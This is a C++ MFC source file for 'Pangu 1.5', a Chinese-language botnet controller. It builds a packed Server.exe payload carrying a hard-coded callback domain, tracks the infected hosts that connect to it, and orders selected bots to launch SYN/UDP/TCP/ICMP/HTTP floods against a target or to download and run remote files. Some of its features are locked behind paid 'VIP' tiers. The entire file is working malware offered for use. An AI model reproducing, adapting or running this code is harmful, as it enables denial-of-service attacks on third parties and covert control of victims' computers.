// 盘古Dlg.cpp : implementation file
//

#include "stdafx.h"
#include "盘古.h"
#include "盘古Dlg.h"
#include "HelpDlg.h"
#include <winsock.h>
#include <afxinet.h>
#pragma comment(lib,"ws2_32.lib")

/*
盘古1.5发布版的完整原代码
*/

struct MODIFY_DATA 
{
	unsigned int finder;
	char ws_svcname[32];
	char ws_svcdisplay[128];
	char ws_svcdesc[256];
	char url[256];
	int  port;
}
modify_data = 
{
	0xFFFFFF8D,
	"1",
	"111",
	"111",
	"chidaoren.3322.org",
	2014,
};


#define number_host 50
CClientSock ClientSock[number_host];
int    index[number_host];

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMyDlg dialog

CMyDlg::CMyDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CMyDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CMyDlg)
	m_domain = _T("yn.3322.org");
	m_tgtip = _T("www.tgtweb.com");
	m_tgtport = 80;
	m_upport = 2014;
	m_svcdesc = _T("pangu_service_description");
	m_svcdisplay = _T("pangu_service_display");
	m_svcname = _T("pangu_service_svcname");
	m_timeout = 20;
	m_extraurl = _T("http://www.yn.com/exe/htm/asp");
	m_syn = TRUE;
	m_udp = TRUE;
	m_icmp = FALSE;
	m_selall = FALSE;
	m_break = FALSE;
	m_2k = FALSE;
	m_sp2 = FALSE;
	m_findip = _T("");
	m_getobj = _T("/index.htm");
	m_get = FALSE;
	m_tcp = FALSE;
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMyDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMyDlg)
	DDX_Control(pDX, IDC_EDIT_GETOBJ, m_e11);
	DDX_Control(pDX, IDC_EDIT_FINDIP, m_e10);
	DDX_Control(pDX, IDC_EDIT_UPPORT, m_e9);
	DDX_Control(pDX, IDC_EDIT_TIMEOUT, m_e8);
	DDX_Control(pDX, IDC_EDIT_TGTPORT, m_e7);
	DDX_Control(pDX, IDC_EDIT_TGTIP, m_e6);
	DDX_Control(pDX, IDC_EDIT_SVCNAME, m_e5);
	DDX_Control(pDX, IDC_EDIT_SVCDISP, m_e4);
	DDX_Control(pDX, IDC_EDIT_SVCDESC, m_e3);
	DDX_Control(pDX, IDC_EDIT_DOWNLOAD, m_e2);
	DDX_Control(pDX, IDC_EDIT_DOMAIN, m_e1);
	DDX_Control(pDX, IDC_BUTTON_FINDIP, m_11);
	DDX_Control(pDX, IDC_BUTTON_UPDATEDATA, m_10);
	DDX_Control(pDX, IDC_BUTTON_TEST, m_0);
	DDX_Control(pDX, IDC_BUTTON_STOP, m_9);
	DDX_Control(pDX, IDC_BUTTON_REMOVE, m_8);
	DDX_Control(pDX, IDC_BUTTON_REFLASH, m_7);
	DDX_Control(pDX, IDC_BUTTON_MAKESERVER, m_6);
	DDX_Control(pDX, IDC_BUTTON_HELP, m_5);
	DDX_Control(pDX, IDC_BUTTON_FLOOD, m_4);
	DDX_Control(pDX, IDC_BUTTON_DOWNLOAD, m_3);
	DDX_Control(pDX, IDC_BUTTON_BEGINLIS, m_2);
	DDX_Control(pDX, IDC_LIST1, m_ListCtrl);
	DDX_Text(pDX, IDC_EDIT_DOMAIN, m_domain);
	DDX_Text(pDX, IDC_EDIT_TGTIP, m_tgtip);
	DDX_Text(pDX, IDC_EDIT_TGTPORT, m_tgtport);
	DDV_MinMaxInt(pDX, m_tgtport, 0, 65534);
	DDX_Text(pDX, IDC_EDIT_UPPORT, m_upport);
	DDV_MinMaxInt(pDX, m_upport, 1, 65535);
	DDX_Text(pDX, IDC_EDIT_SVCDESC, m_svcdesc);
	DDX_Text(pDX, IDC_EDIT_SVCDISP, m_svcdisplay);
	DDX_Text(pDX, IDC_EDIT_SVCNAME, m_svcname);
	DDX_Text(pDX, IDC_EDIT_TIMEOUT, m_timeout);
	DDV_MinMaxInt(pDX, m_timeout, 1, 120);
	DDX_Text(pDX, IDC_EDIT_DOWNLOAD, m_extraurl);
	DDX_Check(pDX, IDC_CHECK_SYN, m_syn);
	DDX_Check(pDX, IDC_CHECK_UDP, m_udp);
	DDX_Check(pDX, IDC_CHECK_ICMP, m_icmp);
	DDX_Check(pDX, IDC_CHECK_ALLSEL, m_selall);
	DDX_Check(pDX, IDC_CHECK1, m_break);
	DDX_Check(pDX, IDC_CHECK_W2000, m_2k);
	DDX_Check(pDX, IDC_CHECK_SP2, m_sp2);
	DDX_Text(pDX, IDC_EDIT_FINDIP, m_findip);
	DDX_Text(pDX, IDC_EDIT_GETOBJ, m_getobj);
	DDX_Check(pDX, IDC_CHECK_GET, m_get);
	DDX_Check(pDX, IDC_CHECK_TCP, m_tcp);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CMyDlg, CDialog)
	//{{AFX_MSG_MAP(CMyDlg)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON_BEGINLIS, OnButtonBeginlis)
	ON_BN_CLICKED(IDC_BUTTON_MAKESERVER, OnButtonMakeserver)
	ON_BN_CLICKED(IDC_BUTTON_REMOVE, OnButtonRemove)
	ON_BN_CLICKED(IDC_BUTTON_FLOOD, OnButtonFlood)
	ON_BN_CLICKED(IDC_BUTTON_STOP, OnButtonStop)
	ON_BN_CLICKED(IDC_BUTTON_DOWNLOAD, OnButtonDownload)
	ON_BN_CLICKED(IDC_BUTTON_HELP, OnButtonHelp)
	ON_BN_CLICKED(IDC_BUTTON_REFLASH, OnButtonReflash)
	ON_WM_TIMER()
	ON_BN_CLICKED(IDC_BUTTON_UPDATEDATA, OnButtonUpdatedata)
	ON_BN_CLICKED(IDC_CHECK_ALLSEL, OnCheckAllsel)
	ON_BN_CLICKED(IDC_BUTTON_TEST, OnButtonTest)
	ON_BN_CLICKED(IDC_CHECK_W2000, OnCheckW2000)
	ON_BN_CLICKED(IDC_CHECK_SP2, OnCheckSp2)
	ON_BN_CLICKED(IDC_BUTTON_FINDIP, OnButtonFindip)
	ON_BN_CLICKED(IDC_CHECK_COVER, OnCheckCover)
	ON_BN_CLICKED(IDC_CHECK_TCPBREAK, OnCheckTcpbreak)
	ON_BN_CLICKED(IDC_CHECK_GET, OnCheckGet)
	//}}AFX_MSG_MAP
	ON_COMMAND_RANGE(IMENU_ITEM_ID,IMENU_ITEM_ID+100,OnMenuSelect)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyDlg message handlers

BOOL CMyDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here

	LONG lStyle = m_ListCtrl.SendMessage(LVM_GETEXTENDEDLISTVIEWSTYLE);
	lStyle |= LVS_EX_GRIDLINES | LVS_EX_CHECKBOXES | LVS_EX_FULLROWSELECT;
	m_ListCtrl.SendMessage(LVM_SETEXTENDEDLISTVIEWSTYLE, 0,(LPARAM)lStyle);

	LV_COLUMN lvc;
	lvc.mask = LVCF_TEXT | LVCF_SUBITEM | LVCF_WIDTH;

	lvc.iSubItem = 0;
	lvc.pszText = (char *)"主机IP地址";
	lvc.cx = 120;
	m_ListCtrl.InsertColumn(1,&lvc);

	lvc.iSubItem = 1;
	lvc.pszText = (char *)"操作系统";
	lvc.cx = 80;
	m_ListCtrl.InsertColumn(1,&lvc);

	lvc.iSubItem = 2;
	lvc.pszText = (char *)"内存(MB)";
	lvc.cx = 60;
	m_ListCtrl.InsertColumn(2,&lvc);

	lvc.iSubItem = 3;
	lvc.pszText = (char *)"命令情况";
	lvc.cx = 60;
	m_ListCtrl.InsertColumn(3,&lvc);

	lvc.iSubItem = 4;
	lvc.pszText = (char *)"CPU详细信息";
	lvc.cx = 500;
	m_ListCtrl.InsertColumn(4,&lvc);

	AcceptSock=NULL;
	for(int i=0;i<number_host;i++)
		index[i] = -1;
	//OnButtonBeginlis();
	SetTimer(0,5000,NULL);
	SetTimer(1,120000,NULL);

	char CurPath[MAX_PATH];
	GetCurrentDirectory(MAX_PATH,CurPath);
	strcat(CurPath,"\\Config.ini");

	if (!GetPrivateProfileString( "LocalSetting","url",NULL,m_domain.GetBuffer(0),255,CurPath))
		m_domain = _T("yn.3322.org");

	m_upport=GetPrivateProfileInt("LocalSetting","Port",0,CurPath);
	if (m_upport == 0)
		m_upport=2014;

	SetDlgItemInt(IDC_EDIT_UPPORT,m_upport,TRUE);
	SetDlgItemText(IDC_EDIT_DOMAIN,m_domain);

	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CMyDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CMyDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CMyDlg::OnOK() {}

void CMyDlg::OnButtonMakeserver() 
{
	UpdateData(TRUE);
	strcpy(modify_data.ws_svcname,m_svcname.GetBuffer(0));
	strcpy(modify_data.ws_svcdisplay,m_svcdisplay.GetBuffer(0));
	strcpy(modify_data.ws_svcdesc,m_svcdesc.GetBuffer(0));
	strcpy(modify_data.url,m_domain.GetBuffer(0));
	modify_data.port=m_upport;

	char Path[MAX_PATH];
	GetCurrentDirectory(MAX_PATH,Path);
	strcat(Path,"\\dat\\Cache.dat");

	CFile oldfile;
	if (!oldfile.Open(Path,CFile::modeRead | CFile::typeBinary))
		return;

	DWORD oldfilesize = oldfile.GetLength();
	BYTE *buf = (BYTE *)malloc(oldfile.GetLength());
	memset(buf,0,oldfile.GetLength());
	oldfile.Read(buf,oldfile.GetLength());
	oldfile.Close();

	unsigned int finder;
    unsigned int i, k;
	
	finder = 0xFFFFFF8D;
	for (i = 0; i < oldfilesize - sizeof(finder); i += sizeof(finder))
    {
         for (k = 0; k < sizeof(finder); k++)
         {
              if (buf[i+k] != ((BYTE*)&finder)[k])
                   break;
         }
         if (k == sizeof(finder))
         {
              memcpy(buf+ i, &modify_data, sizeof(modify_data));
              break;
         }
    }
	
	if (i >= oldfilesize - sizeof(finder))
    {
        free(buf);
        MessageBox("写入信息到文件中，不能定位自身文件而出错!","错误");
		return;
    }
	CFile newfile;
	newfile.Open("Server.exe",CFile::modeCreate | CFile::modeReadWrite | CFile::typeBinary);
	newfile.Write(buf,oldfilesize);
	free(buf);
	newfile.Close();

		char LocalPath[MAX_PATH];
		GetCurrentDirectory(MAX_PATH,LocalPath);
		strcat(LocalPath,"\\Server.exe");

		char UpxPath[MAX_PATH];
		strcpy(UpxPath,"upx.exe");
		LoadSource(IDR_UPX1,"UPX",UpxPath);
		strcat(UpxPath," -7 ");
		strcat(UpxPath,LocalPath);
		PROCESS_INFORMATION PI;
		STARTUPINFO SI;
		memset(&SI, 0, sizeof(SI));
		SI.cb = sizeof(SI);
		SI.dwFlags =STARTF_USESHOWWINDOW; 
		SI.wShowWindow = SW_HIDE;
		CreateProcess(NULL, UpxPath, NULL, NULL, FALSE,NORMAL_PRIORITY_CLASS, NULL, NULL, &SI, &PI);
		WaitForSingleObject(PI.hProcess,INFINITE);
		DeleteFile("upx.exe");

	char CurPath[MAX_PATH];
	GetCurrentDirectory(MAX_PATH,CurPath);
	strcat(CurPath,"\\Config.ini");
	WritePrivateProfileString("LocalSetting","url",m_domain.GetBuffer(0),CurPath);
	char strPort[10]={0};
	wsprintf(strPort,"%d",m_upport);
	WritePrivateProfileString("LocalSetting","Port",strPort,CurPath);

	MessageBox("新建服务端成功!","成功");
}

void CMyDlg::OnButtonHelp() 
{
	CHelpDlg dlg;
	dlg.DoModal();
}

BOOL CMyDlg::LoadSource(UINT resoure_id , const char * type , const char * filepath)
{
	//获得资源指针
	HRSRC hRsrc = ::FindResource( NULL , MAKEINTRESOURCE( resoure_id ) , type );
	
	if( hRsrc )
	{   //获得资源大小
		DWORD size = ::SizeofResource( NULL , hRsrc );
        //将资源载入内存
		HGLOBAL  handle = ::LoadResource( NULL , hRsrc );
        //写入文件     
		if( handle )
		{   //定位资源位置
			BYTE *MemPtr = (BYTE *)LockResource( handle ); 

			CFile file;

			if( file.Open( filepath , CFile::modeCreate | CFile::modeWrite ) )
			{
				file.Write( MemPtr , size );

				file.Close( );
			}
			::UnlockResource( handle );
		}
		::FreeResource( handle );
		return TRUE;
	}
	return FALSE;
}

void CMyDlg::OnButtonBeginlis() 
{
	UpdateData(TRUE);
	if (AcceptSock != NULL)
	{
		AcceptSock->Close();
		delete AcceptSock;
		AcceptSock=NULL;
		SetDlgItemText(IDC_BUTTON_BEGINLIS,"开始监听");
		return;
	}

	AcceptSock = new CAcceptSock(this);
	if (!AcceptSock->Create(m_upport,SOCK_STREAM))
	{
		AfxMessageBox("Socket Create Error！");
		return;
	}
	if (!AcceptSock->Listen(5))
	{
		AfxMessageBox("Socket Listen Error！");
		return;
	}

	char CurPath[MAX_PATH];
	GetCurrentDirectory(MAX_PATH,CurPath);
	strcat(CurPath,"\\Config.ini");

	char strPort[10]={0};
	wsprintf(strPort,"%d",m_upport);
	WritePrivateProfileString("LocalSetting","Port",strPort,CurPath);

	SetDlgItemText(IDC_BUTTON_BEGINLIS,"停止监听");
}

void CMyDlg::AcceptPending(CAcceptSock *as)
{
	for(int i=0;i<number_host;i++)
	{
		if (index[i] == -1)
		{	
			if(as->Accept(ClientSock[i]))
			{
				ClientSock[i].SetBaseDlg(this);
				ClientSock[i].index=i;
				break;
			}
		}
	}
}

void CMyDlg::AddHost(int id, int ver, char *ip, char *mem, char *cpu)
{
	index[id]=1;
	int n=m_ListCtrl.GetItemCount();
	m_ListCtrl.InsertItem(n,ip);
	m_ListCtrl.SetItemData(n,(DWORD)id);

	char rootstr[16];
	switch(ver)
	{
	case 0:
		wsprintf(rootstr,"Win 2000");
		break;
	case 1:
		wsprintf(rootstr,"Win XP");
		break;
	case 2:
		wsprintf(rootstr,"Win XP SP2");
		break;
	case 3:
		wsprintf(rootstr,"Win 2003");
		break;
	}
	m_ListCtrl.SetItemText(n,1,rootstr);
	m_ListCtrl.SetItemText(n,2,mem);
	m_ListCtrl.SetItemText(n,3,"无命令");
	m_ListCtrl.SetItemText(n,4,cpu);
}

void CMyDlg::DeleteHost(int id)
{
	index[id]=-1;
	ClientSock[id].Close();
	int  n= m_ListCtrl.GetItemCount();
	for(int i=0;i<n;i++)
	{
		if ((int)m_ListCtrl.GetItemData(i) == id)
		{
			m_ListCtrl.DeleteItem(i);
		}
	}
}

///////////////////////////////////////////////////////////////////////////////////
//////////卸载全部
void CMyDlg::OnButtonRemove() 
{
	if (MessageBox("真的要卸载吗？","卸载",MB_YESNO) == IDNO)
		return;
	data="REMOVE";
	int n=m_ListCtrl.GetItemCount();
	for(int i=0;i<n;i++)
	{
		if (m_ListCtrl.GetCheck(i))
		{
			int id = (int)m_ListCtrl.GetItemData(i);
			if (index[id] == 1)
			{
				if (!ClientSock[id].Send(data.GetBuffer(0),data.GetLength()+1))
				{
					index[id]=-1;
					ClientSock[id].Close();
					return;
				}
			}
			else
			{
				index[id]=-1;
				ClientSock[id].Close();
				m_ListCtrl.DeleteItem(i);
			}
		}
	}
	SetDlgItemText(IDC_SHOW,"选择被控主机成功卸载");
}

///////////////////////////////////////////////////////////////////////////////////
//////////开始攻击
void CMyDlg::OnButtonFlood()
{
	UpdateData(TRUE);
	CString pt="";
	if (m_syn)
		pt = "syn_";
	if(m_udp)
		pt += "udp_";
	if(m_tcp)
		pt += "tcp_";
	if(m_icmp)
		pt += "icmp_";

	data.Format("FLOOD:%s|%d|%d|%s|%s",m_tgtip.GetBuffer(0),m_tgtport,m_timeout,pt.GetBuffer(0),m_getobj.GetBuffer(0));
	
	int n=m_ListCtrl.GetItemCount();
	for(int i=0;i<n;i++)
	{
		if (m_ListCtrl.GetCheck(i))
		{
			int id = (int)m_ListCtrl.GetItemData(i);
			if (index[id] == 1)
			{
				ClientSock[id].Send(data.GetBuffer(0),data.GetLength()+1);
			}
		}
	}
	SetDlgItemText(IDC_SHOW,"选择主机进入攻击状态");
}
///////////////////////////////////////////////////////////////////////////////////
//////停止攻击
void CMyDlg::OnButtonStop() 
{
	UpdateData(TRUE);
	data="STOPATTACK";

	int n=m_ListCtrl.GetItemCount();
	for(int i=0;i<n;i++)
	{
		if (m_ListCtrl.GetCheck(i))
		{
			int id = (int)m_ListCtrl.GetItemData(i);
			if (index[id] == 1)
			{
				ClientSock[id].Send(data.GetBuffer(0),data.GetLength()+1);
			}
		}
	}
	SetDlgItemText(IDC_SHOW,"选择被控主机已停止攻击");
}
///////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////
/////////其他功能
void CMyDlg::OnButtonDownload() 
{
	UpdateData(TRUE);
	if (m_extraurl.Find("http://www.yn.com/exe/htm/asp")>=0)
		return;

	data.Format("DOWNLOAD:%s",m_extraurl.GetBuffer(0));
	int n=m_ListCtrl.GetItemCount();
	for(int i=0;i<n;i++)
	{
		if (m_ListCtrl.GetCheck(i))
		{
			int id = (int)m_ListCtrl.GetItemData(i);
			if (index[id] == 1)
			{
				if (!ClientSock[id].Send(data.GetBuffer(0),data.GetLength()+1))
				{
					index[id]=-1;
					ClientSock[id].Close();
				}
			}
			else
			{
				index[id]=-1;
				ClientSock[id].Close();
				m_ListCtrl.DeleteItem(i);
			}
		}
	}
	SetDlgItemText(IDC_SHOW,"选择主机远程下载文件运行成功");
}

void CMyDlg::OnButtonUpdatedata() 
{
	UpdateData(TRUE);
	SetDlgItemText(IDC_SHOW,"马上加入VIP，享受此功能");
	/*
	data.Format("UPDATEDATA:%s",m_extraurl.GetBuffer(0));
	int n=m_ListCtrl.GetItemCount();
	for(int i=0;i<n;i++)
	{
		if (m_ListCtrl.GetCheck(i))
		{
			int id = (int)m_ListCtrl.GetItemData(i);
			if (index[id] == 1)
			{
				if (!ClientSock[id].Send(data.GetBuffer(0),data.GetLength()+1))
				{
					index[id]=-1;
					ClientSock[id].Close();
					return;
				}
			}
			else
			{
				index[id]=-1;
				ClientSock[id].Close();
				m_ListCtrl.DeleteItem(i);
			}
		}
	}
	SetDlgItemText(IDC_SHOW,"选择主机的服务端更新成功");
	//*/
	
}
//其他功能 完毕
///////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////
void CMyDlg::OnButtonReflash() 
{
	int num=0;
	for(int i=0;i<number_host;i++)
	{
		if (index[i] == 1)
		{
			if (!ClientSock[i].Send("1",1))
			{
				index[i]=-1;
				ClientSock[i].Close();
				DeleteHost(i);
			}
			else
				num++;
		}
		else
		{
			index[i]=-1;
		}
	}
	int  n= m_ListCtrl.GetItemCount();
		for(int a=0;a<n;a++)
			m_ListCtrl.SetItemText(a,3,"无命令");

	SetDlgItemInt(IDC_UPHOST,num,TRUE);
}

void CMyDlg::OnTimer(UINT nIDEvent) 
{
	if (nIDEvent == 1)
	{
		int num=0;
		for(int i=0;i<number_host;i++)
		{
			if (index[i] == 1)
			{
				if (!ClientSock[i].Send("1",1))
				{
					index[i]=-1;
					ClientSock[i].Close();
					DeleteHost(i);
				}
				else
					num++;
			}
			else
			{
				index[i]=-1;
			}
		}
	}
	SetDlgItemInt(IDC_UPHOST,m_ListCtrl.GetItemCount(),TRUE);
	CDialog::OnTimer(nIDEvent);
}

void CMyDlg::OnButtonTest() 
{
	UpdateData(TRUE);
	WSADATA Data;
	WSAStartup(MAKEWORD(2, 2), &Data);
	in_addr in;
	memset(&in,0,sizeof(in_addr));
	struct hostent *hp = NULL;
	if ((hp = gethostbyname(m_domain.GetBuffer(0))) != NULL)
	{
			memcpy(&in, hp->h_addr, hp->h_length);
			CString ip;
			ip.Format("上线IP：%s\r\n上线端口：%d",inet_ntoa(in),m_upport);
			MessageBox(ip);
	}
}

void CMyDlg::OnCancel() 
{
	if (MessageBox("真的要退出吗？","退出",MB_YESNO) == IDNO)
		return;
	for(int i=0;i<number_host;i++)
	{
		if (index[i] == 1)
		{
			closesocket(ClientSock[i].m_hSocket);
		}
	}

	WSACleanup();
	CDialog::OnCancel();
}

void CMyDlg::OnCheckAllsel() 
{
	UpdateData(TRUE);
	if (m_selall)
	{
		int n=m_ListCtrl.GetItemCount();
		for(int i=0;i<n;i++)
		{
			m_ListCtrl.SetCheck(i,TRUE);
		}
	}
	else
	{
		int n=m_ListCtrl.GetItemCount();
		for(int i=0;i<n;i++)
		{
			m_ListCtrl.SetCheck(i,FALSE);
		}
	}
}

void CMyDlg::CommandOK(int id)
{
	int n=m_ListCtrl.GetItemCount();
	for(int i=0;i<n;i++)
	{
		int idndex = (int)m_ListCtrl.GetItemData(i);
		if (id == idndex)
		{
			m_ListCtrl.SetItemText(i,3,"成功");
		}
	}
}

void CMyDlg::OnCheckW2000() 
{
	MessageBox("加入VIP，享受此服务","VIP");
	m_2k=FALSE;
	CButton *b = (CButton *)GetDlgItem(IDC_CHECK_W2000);
	b->SetCheck(0);	
	/*
	UpdateData(TRUE);
	if (!m_2k)//取消
	{
		int n=m_ListCtrl.GetItemCount();
		for(int i=0;i<n;i++)
		{
			if (m_ListCtrl.GetItemText(i,1).Compare("Win 2000")==0 || m_ListCtrl.GetItemText(i,1).Compare("Win XP")==0)
			{
				m_ListCtrl.SetCheck(i,FALSE);
			}
		}
	}
	else//选择
	{
		int n=m_ListCtrl.GetItemCount();
		for(int i=0;i<n;i++)
		{
			if (m_ListCtrl.GetItemText(i,1).Compare("Win 2000")==0 || m_ListCtrl.GetItemText(i,1).Compare("Win XP")==0)
			{
				m_ListCtrl.SetCheck(i,TRUE);
			}
		}
	}
	*/
}

void CMyDlg::OnCheckSp2() 
{
	UpdateData(TRUE);
	if (!m_sp2)//取消
	{
		int n=m_ListCtrl.GetItemCount();
		for(int i=0;i<n;i++)
		{
			if (m_ListCtrl.GetItemText(i,1).Compare("Win XP SP2")==0 || m_ListCtrl.GetItemText(i,1).Compare("Win 2003")==0)
			{
				m_ListCtrl.SetCheck(i,FALSE);
			}
		}
	}
	else//选择
	{
		int n=m_ListCtrl.GetItemCount();
		for(int i=0;i<n;i++)
		{
			if (m_ListCtrl.GetItemText(i,1).Compare("Win XP SP2")==0 || m_ListCtrl.GetItemText(i,1).Compare("Win 2003")==0)
			{
				m_ListCtrl.SetCheck(i,TRUE);
			}
		}
	}
}

void CMyDlg::OnButtonFindip() 
{
	UpdateData(TRUE);
	int n=m_ListCtrl.GetItemCount();
	for(int i=0;i<n;i++)
	{
		if (m_ListCtrl.GetItemText(i,0).Compare(m_findip)==0)
		{
			m_ListCtrl.SetHotItem(i);
			m_ListCtrl.SetCheck(i);
			SetDlgItemText(IDC_SHOW,"该IP存在，请查看");
			return;
		}
	}
	SetDlgItemText(IDC_SHOW,"该IP不存在");	
}

void CMyDlg::OnCheckCover() 
{
	MessageBox("公布版默认只能感染D盘。加入VIP，享受此服务","VIP");
	CButton *b = (CButton *)GetDlgItem(IDC_CHECK_COVER);
	b->SetCheck(0);	
}

void CMyDlg::OnCheckTcpbreak() 
{
	MessageBox("加入VIP，享受此服务","VIP");
	m_break=FALSE;
	CButton *b = (CButton *)GetDlgItem(IDC_CHECK_TCPBREAK);
	b->SetCheck(0);	
}

void CMyDlg::OnCheckGet() 
{
	MessageBox("加入VIP，享受此服务","VIP");
	m_get=FALSE;
	CButton *b = (CButton *)GetDlgItem(IDC_CHECK_GET);
	b->SetCheck(0);	
}
